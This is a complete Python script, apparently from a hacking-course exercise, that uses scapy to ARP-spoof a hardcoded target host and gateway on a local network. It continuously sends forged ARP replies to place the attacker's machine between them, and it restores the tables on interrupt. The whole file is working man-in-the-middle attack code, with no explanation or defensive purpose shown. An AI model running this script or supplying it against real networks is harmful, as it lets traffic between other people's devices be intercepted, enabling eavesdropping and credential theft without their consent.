import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    # print(arp_req.summary())
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arb = broadcast / arp_req
    answered = scapy.srp(arb, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc


def arp_spoofer(target_ip, spoofer_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, psrc=spoofer_ip, pdst=target_ip, hwdst=target_mac)
    scapy.send(packet, verbose=False)


def resolve(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, psrc=source_ip, hwsrc=source_mac, pdst=dest_ip, hwdst=dest_mac)
    scapy.send(packet, count=4, verbose=False)


count = 2
target_ip = "192.168.0.107"
gateway_ip = "192.168.0.1"
try:
    while True:
        arp_spoofer(gateway_ip, target_ip)
        arp_spoofer(target_ip, gateway_ip)
        print("\r[+] Packet Sent : " + str(count) + ";", end=" ")
        count+=2
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n [-] Keyboard Interrupt...[Ctrl+C] !!! Resolving IP Tables !!!")
    resolve(gateway_ip, target_ip)
    resolve(target_ip, gateway_ip)
